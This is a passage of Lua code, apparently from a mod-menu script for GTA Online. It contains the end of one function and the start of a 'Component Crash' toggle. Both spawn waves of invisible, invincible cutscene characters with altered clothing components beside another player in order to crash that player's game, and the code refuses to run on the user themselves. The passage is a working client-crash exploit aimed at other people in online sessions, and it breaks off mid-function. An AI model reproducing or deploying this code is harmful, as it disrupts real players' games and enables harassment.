                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds7[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_devin")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds8 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds8[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_guadalope")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds9 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds9[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_gurk")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds10 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds10[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_jimmydisanto")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds11 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds11[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_josh")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds12 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds12[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lamardavis")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds13 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds13[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds14 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds14[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest_3")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds15 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds15[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_martinmadrazo")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds16 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds16[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_milton")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds17 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds17[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_molly")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds18 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds18[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_mrs_thornhill")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds19 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds19[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_nigel")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds20 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds20[i])
                    util.yield(5)					
                end
                util.yield(100)
                menu.trigger_commands("panic off")
                util.toast("Done")
            else
                util.toast("You can't use it on yourself")
            end
    end)


    menu.toggle_loop(clothescrash, "Component Crash", {"toggleclothescrash"}, "Crash clothes", function(on_toggle)
            if pid ~= players.user() then
                util.toast("Wait 20 Seconds...")
                local math_random = math.random
                local joaat = util.joaat
                menu.trigger_commands("panic on")
                util.yield(100)
                local pedhash = util.joaat("P_franklin_02")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds1 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds1[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds1[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds1[i], "Walk_Facility", 0, false)
